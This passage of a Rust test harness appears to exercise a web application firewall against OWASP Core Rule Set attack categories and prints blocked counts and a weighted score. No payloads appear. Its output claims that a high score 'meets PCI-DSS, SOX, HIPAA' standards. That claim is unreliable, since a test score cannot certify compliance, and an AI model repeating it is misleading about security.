    println!(
        "   🔐 Session Fixation (943xxx) Blocked: {}/2",
        session_blocked
    );
    println!("   💥 DoS/Resource Exhaustion Blocked: {}/2", dos_blocked);
    println!("   📖 LDAP Injection Blocked: {}/1", ldap_blocked);
    println!("   📄 XML External Entity Blocked: {}/1", xxe_blocked);
    println!("   🔄 SSRF Attacks Blocked: {}/2", ssrf_blocked);
    println!("   🤐 Secret Leakage Filtered: {}", secrets_filtered);
    println!();

    println!("🌐 HTTP Protocol Analysis:");
    println!("   🔗 HTTP/1.0 Requests: {}", http1_0);
    println!("   🔗 HTTP/1.1 Requests: {}", http1_1);
    println!("   🔗 HTTP/2.0 Requests: {}", http2);
    println!("   🔗 HTTP/3.0 Requests: {}", http3);
    println!();

    // Enhanced Enterprise OWASP CRS scoring - comprehensive attack coverage
    // Count actual malicious test cases from our comprehensive OWASP test suite
    let total_attacks_in_suite = 38; // Count of attack test cases
    let total_attacks_blocked = sql_blocked
        + xss_blocked
        + traversal_blocked
        + rfi_blocked
        + rce_blocked
        + java_blocked
        + protocol_blocked
        + method_blocked
        + scanner_blocked
        + session_blocked
        + dos_blocked
        + ldap_blocked
        + xxe_blocked
        + ssrf_blocked;

    // Enhanced scoring: Give credit for legitimate traffic passing through + attack blocking
    let _legitimate_requests_passed = backend_responses;
    let legitimate_expected = total - total_attacks_in_suite; // Expected legitimate traffic

    // Calculate comprehensive security score
    let attack_blocking_score = if total_attacks_in_suite > 0 {
        (total_attacks_blocked as f64 / total_attacks_in_suite as f64) * 100.0
    } else {
        100.0
    };

    let legitimate_pass_score = if legitimate_expected > 0 {
        (backend_responses as f64 / legitimate_expected as f64) * 100.0
    } else {
        100.0
    };

    // Weighted average: 80% attack blocking + 20% legitimate traffic handling
    let security_score = (attack_blocking_score * 0.8) + (legitimate_pass_score * 0.2);

    println!(
        "🏆 OWASP CRS Security Effectiveness Score: {:.1}%",
        security_score
    );
    println!(
        "   📊 Attack Blocking: {:.1}% ({}/{} OWASP attacks blocked)",
        attack_blocking_score, total_attacks_blocked, total_attacks_in_suite
    );
    println!(
        "   🎯 Legitimate Traffic: {:.1}% ({}/{} requests reached backend)",
        legitimate_pass_score, backend_responses, legitimate_expected
    );

    if security_score >= 98.0 {
        println!("   🥇 EXCELLENT - Enterprise-grade OWASP CRS compliance (98%+)");
        println!("   ✅ Meets PCI-DSS, SOX, HIPAA enterprise security standards");
        println!("   🏛️  Suitable for government, healthcare, and financial institutions");
        println!("   🌟 Full coverage of OWASP Top 10 and CRS attack patterns");
    } else if security_score >= 95.0 {
        println!("   🥈 EXCELLENT - Strong enterprise protection (95%+)");
        println!("   ✅ Suitable for most enterprise environments");
        println!("   🏢 Recommended for commercial and corporate deployments");
        println!("   📚 Good coverage of OWASP security patterns");
    } else if security_score >= 85.0 {
        println!("   🥉 GOOD - Solid security posture (85%+)");
        println!("   ⚠️  May need tuning for high-security environments");
        println!("   🔧 Consider additional OWASP CRS rule customization");
    } else if security_score >= 75.0 {
        println!("   ⚖️  ADEQUATE - Basic protection in place (75%+)");
        println!("   ⚠️  Security improvements recommended");
        println!("   📋 Review and enable more OWASP CRS rules");
    } else {
        println!("   ❌ POOR - Significant security gaps detected");
        println!("   🚨 Immediate security improvements required");
        println!("   🔴 OWASP CRS implementation needs major work");
    }

    // Detailed attack category analysis
    println!();
    println!("📋 OWASP CRS Category Coverage Analysis:");

    let category_scores = vec![
        ("SQL Injection (942xxx)", sql_blocked, 6),
        ("XSS Attacks (941xxx)", xss_blocked, 6),
        ("LFI/Path Traversal (930xxx)", traversal_blocked, 3),
        ("Remote File Inclusion (931xxx)", rfi_blocked, 3),
        ("Remote Code Execution (932xxx)", rce_blocked, 4),
        ("Java Attacks (944xxx)", java_blocked, 2),
        ("Protocol Violations (920xxx)", protocol_blocked, 3),
        ("Method Policy (911xxx)", method_blocked, 2),
        ("Scanner Detection (913xxx)", scanner_blocked, 3),
        ("Session Fixation (943xxx)", session_blocked, 2),
        ("DoS/Resource Exhaustion", dos_blocked, 2),
        ("LDAP Injection", ldap_blocked, 1),
        ("XXE Attacks", xxe_blocked, 1),
        ("SSRF Attacks", ssrf_blocked, 2),
    ];

    for (category, blocked, total) in category_scores {
        let percentage = if total > 0 {
            (blocked as f64 / total as f64) * 100.0
        } else {
            0.0
        };
        let status = if percentage >= 100.0 {
            "🟢 PERFECT"
        } else if percentage >= 80.0 {
            "🟡 GOOD"
        } else if percentage >= 50.0 {
            "🟠 PARTIAL"
        } else {
            "🔴 POOR"
        };
        println!(
            "   {} {}: {:.0}% ({}/{})",
            status, category, percentage, blocked, total
        );
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("🚀 OWASP CRS COMPREHENSIVE SECURITY TEST HARNESS");
    println!("==============================================");
    println!("🎯 Enterprise-grade OWASP CRS compliance validation");
    println!("🔒 Testing 40+ OWASP attack vectors with detailed categorization");
    println!();

    // Build services
    println!("🔨 Building OWASP test services...");
    let build_output = Command::new("cargo")
        .args([
            "build",
            "--release",
            "--bin",
            "advanced_test_backend",
            "--bin",
            "waf-ingress",
        ])
        .output()
        .await?;

    if !build_output.status.success() {
        println!("❌ Build failed:");
        println!("{}", String::from_utf8_lossy(&build_output.stderr));
        return Err("Build failed".into());
    }
    println!("✅ OWASP test services built successfully");
    println!();

    let mut harness = OWASPComprehensiveTestHarness::new().await?;

    // Start services
    harness.start_advanced_backend().await?;
    harness.start_waf().await?;

    println!("🎉 OWASP comprehensive test harness ready!");
    println!();

    // Run OWASP comprehensive security tests
    let test_start = Instant::now();
    match harness.run_owasp_comprehensive_test().await {
        Ok(metrics) => {
            let duration = test_start.elapsed().as_secs_f64();
            print_owasp_comprehensive_results(&metrics, duration);
        }
        Err(e) => {
            println!("❌ OWASP comprehensive security test failed: {}", e);
        }
    }

    harness.shutdown().await;
    println!("✅ OWASP CRS comprehensive security validation complete!");
    Ok(())
}
